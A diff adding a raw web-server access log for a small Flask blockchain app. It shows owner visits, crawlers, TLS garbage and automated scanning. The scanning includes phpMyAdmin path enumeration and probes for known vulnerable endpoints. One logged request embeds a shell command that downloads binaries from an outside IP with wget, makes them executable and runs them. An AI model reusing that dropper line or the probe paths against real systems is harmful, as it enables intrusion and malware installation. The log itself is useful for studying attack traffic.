@@ -1,0 +1,966 @@
+ * Serving Flask app 'schndr_blockchain'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://217.154.74.124:80
+Press CTRL+C to quit
+217.80.134.196 - - [06/Feb/2025 12:12:14] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:12:27] "GET /chain HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:12:39] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:12:42] "GET /chain HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:16:20] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:16:20] "GET /favicon.ico HTTP/1.1" 404 -
+217.80.134.196 - - [06/Feb/2025 12:21:16] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:21:19] "GET /chain HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:21:22] "GET /transactions/new HTTP/1.1" 405 -
+217.80.134.196 - - [06/Feb/2025 12:23:58] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:24:13] "GET /chain HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:24:15] "GET /nodes/resolve HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:24:20] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 12:24:26] "GET /nodes/register HTTP/1.1" 405 -
+217.80.134.196 - - [06/Feb/2025 12:24:29] "GET / HTTP/1.1" 200 -
+195.178.110.163 - - [06/Feb/2025 12:29:35] "GET / HTTP/1.1" 200 -
+185.180.140.105 - - [06/Feb/2025 12:48:42] "GET / HTTP/1.1" 200 -
+80.82.77.202 - - [06/Feb/2025 13:24:25] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.82.77.202 - - [06/Feb/2025 13:24:25] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" 400 -
+209.127.111.183 - - [06/Feb/2025 13:33:54] "HEAD / HTTP/1.1" 200 -
+192.241.67.199 - - [06/Feb/2025 13:33:55] "GET / HTTP/1.1" 200 -
+54.90.202.23 - - [06/Feb/2025 13:33:56] "GET /favicon.ico HTTP/1.1" 404 -
+44.203.194.48 - - [06/Feb/2025 13:33:57] "GET /favicon.ico HTTP/1.1" 404 -
+186.179.39.6 - - [06/Feb/2025 13:33:57] "GET /favicon.png HTTP/1.1" 404 -
+44.203.194.48 - - [06/Feb/2025 13:33:57] "GET /favicon.png HTTP/1.1" 404 -
+4.255.101.86 - - [06/Feb/2025 13:39:01] "GET /actuator/health HTTP/1.1" 404 -
+141.255.166.90 - - [06/Feb/2025 14:03:03] "GET / HTTP/1.1" 200 -
+80.82.77.202 - - [06/Feb/2025 14:18:02] "GET / HTTP/1.0" 200 -
+147.161.137.76 - - [06/Feb/2025 14:30:55] "GET / HTTP/1.1" 200 -
+147.161.137.76 - - [06/Feb/2025 14:30:55] "GET /favicon.ico HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:09] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:09] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:09] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:10] "GET /phpMyAdmin-5.2.1/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:10] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:10] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:11] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:11] "GET /admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:11] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:11] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:12] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:12] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:12] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:12] "GET /phpMyAdmin-5.2/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:13] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:13] "GET /database/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:13] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:14] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:14] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:14] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:14] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:15] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:15] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:15] "GET /phpMyAdmin-5.2.1-english/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:16] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:16] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:16] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:16] "GET /mysql/db/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:17] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:17] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:17] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:18] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:18] "GET /sql/sql/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:18] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:18] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:19] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:19] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:19] "GET /phpMyAdmin-5.2.1-all-languages/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:20] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:20] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:20] "GET /phpMyAdmin-latest/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:20] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:21] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:21] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:21] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:22] "GET /pma/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:22] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:22] "GET /index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:22] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:23] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:23] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:23] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:24] "GET /phppma/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:24] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:24] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:24] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:25] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:25] "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:25] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:26] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:26] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:26] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:26] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:27] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:27] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:27] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:28] "GET /PMA/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:28] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:28] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:28] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:29] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:29] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:29] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:30] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:30] "GET /program/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:30] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:30] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:31] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:31] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:31] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:32] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:32] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:32] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:32] "GET /phpMyAdmin6.0/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:33] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:33] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:33] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:34] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:34] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:34] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:34] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:35] "GET /db/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:35] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:35] "GET /mysql/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:36] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:36] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:36] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:36] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:37] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:37] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:37] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:38] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:38] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:38] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:38] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:39] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:39] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:39] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:40] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:40] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:40] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:40] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:41] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:41] "GET /phpmyadmin6/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:41] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:42] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:42] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:42] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:42] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:43] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:43] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:43] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:44] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:44] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:44] "GET /phpMyAdmin6/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:44] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 404 -
+142.11.213.202 - - [06/Feb/2025 14:38:45] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 -
+46.19.138.234 - - [06/Feb/2025 16:23:18] "GET / HTTP/1.1" 200 -
+51.255.76.235 - - [06/Feb/2025 16:30:01] "GET /wp-includes/js/quicktags.js HTTP/1.1" 404 -
+217.80.134.196 - - [06/Feb/2025 16:31:30] "GET / HTTP/1.1" 200 -
+217.80.134.196 - - [06/Feb/2025 16:31:30] "GET /favicon.ico HTTP/1.1" 404 -
+212.244.129.10 - - [06/Feb/2025 16:44:58] "GET / HTTP/1.1" 200 -
+95.214.55.132 - - [06/Feb/2025 17:01:11] "GET / HTTP/1.1" 200 -
+179.43.191.146 - - [06/Feb/2025 17:02:22] "GET / HTTP/1.1" 200 -
+95.214.55.43 - - [06/Feb/2025 17:14:30] "GET / HTTP/1.1" 200 -
+20.118.68.249 - - [06/Feb/2025 17:18:00] "GET /portal/redlion HTTP/1.1" 404 -
+66.249.76.199 - - [06/Feb/2025 17:44:25] "GET /robots.txt HTTP/1.1" 404 -
+66.249.74.162 - - [06/Feb/2025 17:44:26] "GET / HTTP/1.1" 200 -
+66.249.74.162 - - [06/Feb/2025 17:44:27] "GET / HTTP/1.1" 200 -
+66.249.74.162 - - [06/Feb/2025 17:44:28] "GET /favicon.ico HTTP/1.1" 404 -
+195.3.223.73 - - [06/Feb/2025 18:07:52] "GET / HTTP/1.1" 200 -
+172.226.108.57 - - [06/Feb/2025 18:59:41] "GET / HTTP/1.1" 200 -
+172.226.108.57 - - [06/Feb/2025 18:59:43] "GET / HTTP/1.1" 200 -
+172.226.110.61 - - [06/Feb/2025 18:59:44] "GET /favicon.ico HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 20:18:32] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [06/Feb/2025 20:24:10] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [06/Feb/2025 20:29:02] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 20:37:41] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 20:41:07] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 20:47:21] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 21:06:33] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+92.255.57.58 - - [06/Feb/2025 21:44:07] "GET /console/ HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 21:52:52] "GET /_ignition/execute-solution HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 21:54:18] "GET / HTTP/1.1" 200 -
+92.255.57.58 - - [06/Feb/2025 21:59:46] "GET / HTTP/1.1" 200 -
+205.210.31.94 - - [06/Feb/2025 22:28:40] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ö\x9bõT')
+205.210.31.94 - - [06/Feb/2025 22:28:40] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ö\x9bõT" 400 -
+205.210.31.94 - - [06/Feb/2025 22:28:40] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.94 - - [06/Feb/2025 22:28:40] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03ÞÓ\x0f½øÐ ¨~ÐµEÌ\x1f&<\x0eý\x995©\x84Ã5T\x14 7Û ãj\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" 400 -
+92.255.57.58 - - [06/Feb/2025 22:31:38] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+92.255.57.58 - - [06/Feb/2025 22:44:51] "GET /geoserver HTTP/1.1" 404 -
+198.235.24.242 - - [06/Feb/2025 22:56:02] "GET / HTTP/1.0" 200 -
+92.255.57.58 - - [06/Feb/2025 23:19:38] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03jcÐFµÍ1Ý½\x90/Þ²"\x04¸O¶Ò;3Êú.3ÁÑ\x0fôÌÓ1')
+92.255.57.58 - - [06/Feb/2025 23:19:38] "\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03jcÐFµÍ1Ý½\x90/Þ²"\x04¸O¶Ò;3Êú.3ÁÑ\x0fôÌÓ1 {?y\x8aeÕ7,,hÌ\x97©/¼}¨§lÄ¤¼%" 400 -
+5.235.244.114 - - [06/Feb/2025 23:31:47] "GET / HTTP/1.1" 200 -
+179.43.191.146 - - [06/Feb/2025 23:41:27] "GET / HTTP/1.1" 200 -
+141.255.166.90 - - [06/Feb/2025 23:55:04] "GET / HTTP/1.1" 200 -
+46.19.138.234 - - [07/Feb/2025 00:04:42] "GET / HTTP/1.1" 200 -
+95.214.55.43 - - [07/Feb/2025 00:46:29] "GET / HTTP/1.1" 200 -
+185.242.226.116 - - [07/Feb/2025 00:59:34] "GET / HTTP/1.1" 200 -
+45.156.129.130 - - [07/Feb/2025 01:09:21] "GET / HTTP/1.1" 200 -
+141.98.11.35 - - [07/Feb/2025 01:17:10] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+drea4+efefa7;wget+http:/\\/176.65.140.135/efefa7;chmod+777+efefa7;./efefa7+jaws;wget+http:/\\/176.65.140.135/drea4;chmod+777+drea4;./drea4+jaws HTTP/1.1" 404 -
+164.90.160.84 - - [07/Feb/2025 01:39:28] "GET / HTTP/1.1" 200 -
+34.60.42.22 - - [07/Feb/2025 01:40:44] "GET / HTTP/1.1" 200 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03}0¦=\x04gdp³Òey\x1b¿\x8c§Ç\x1b_e©â\x86Y¦¾±²ýJ\x81ö\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+45.58.159.211 - - [07/Feb/2025 01:48:21] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03}0¦=\x04gdp³Òey\x1b¿\x8c§Ç\x1b_e©â\x86Y¦¾±²ýJ\x81ö\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" 400 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03HíGÜ"ÏþØ\x95JmÔ\x97i\x89')
+45.58.159.211 - - [07/Feb/2025 01:48:21] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03HíGÜ"ÏþØ\x95JmÔ\x97i\x89" 400 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET / HTTP/1.1" 200 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET /form.html HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET /upl.php HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET /t4 HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET /geoip/ HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET /favicon.ico HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:21] "GET /1.php HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:22] "GET /systembc/password.php HTTP/1.1" 404 -
+45.58.159.211 - - [07/Feb/2025 01:48:22] "GET /password.php HTTP/1.1" 404 -
+213.195.3.157 - - [07/Feb/2025 01:58:22] "GET / HTTP/1.1" 200 -
+151.77.95.200 - - [07/Feb/2025 01:59:38] "GET / HTTP/1.0" 200 -
+185.196.220.253 - - [07/Feb/2025 02:05:13] "GET / HTTP/1.1" 200 -
+188.253.57.22 - - [07/Feb/2025 02:10:00] "GET / HTTP/1.1" 200 -
+89.248.173.219 - - [07/Feb/2025 02:15:12] "GET / HTTP/1.1" 200 -
+141.255.166.90 - - [07/Feb/2025 02:34:03] "GET / HTTP/1.1" 200 -
+80.82.77.202 - - [07/Feb/2025 02:45:39] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.82.77.202 - - [07/Feb/2025 02:45:39] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À" 400 -
+52.78.37.76 - - [07/Feb/2025 02:53:42] "GET /robots.txt HTTP/1.1" 404 -
+52.78.37.76 - - [07/Feb/2025 02:53:43] "HEAD / HTTP/1.1" 200 -
+52.78.37.76 - - [07/Feb/2025 02:53:44] "GET / HTTP/1.1" 200 -
+40.78.88.244 - - [07/Feb/2025 03:07:04] code 400, message Bad request syntax ('MGLNDD_217.154.74.124_80')
+40.78.88.244 - - [07/Feb/2025 03:07:04] "MGLNDD_217.154.74.124_80" 400 -
+45.149.241.61 - - [07/Feb/2025 03:12:25] "GET / HTTP/1.0" 200 -
+116.203.211.224 - - [07/Feb/2025 03:18:47] "GET / HTTP/1.1" 200 -
+209.127.106.95 - - [07/Feb/2025 03:36:29] "HEAD / HTTP/1.1" 200 -
+170.246.53.166 - - [07/Feb/2025 03:36:30] "GET / HTTP/1.1" 200 -
+52.91.167.173 - - [07/Feb/2025 03:36:30] "GET /favicon.ico HTTP/1.1" 404 -
+54.91.154.80 - - [07/Feb/2025 03:36:31] "GET /favicon.ico HTTP/1.1" 404 -
+209.127.110.60 - - [07/Feb/2025 03:36:33] "GET /favicon.png HTTP/1.1" 404 -
+54.91.154.80 - - [07/Feb/2025 03:36:33] "GET /favicon.png HTTP/1.1" 404 -
+45.149.241.61 - - [07/Feb/2025 03:43:40] "GET / HTTP/1.1" 200 -
+35.203.211.134 - - [07/Feb/2025 03:48:23] "GET / HTTP/1.1" 200 -
+64.62.197.94 - - [07/Feb/2025 03:51:17] "GET / HTTP/1.1" 200 -
+64.62.197.96 - - [07/Feb/2025 03:53:47] "GET /favicon.ico HTTP/1.1" 404 -
+64.62.197.103 - - [07/Feb/2025 03:54:15] "GET /geoserver/web/ HTTP/1.1" 404 -
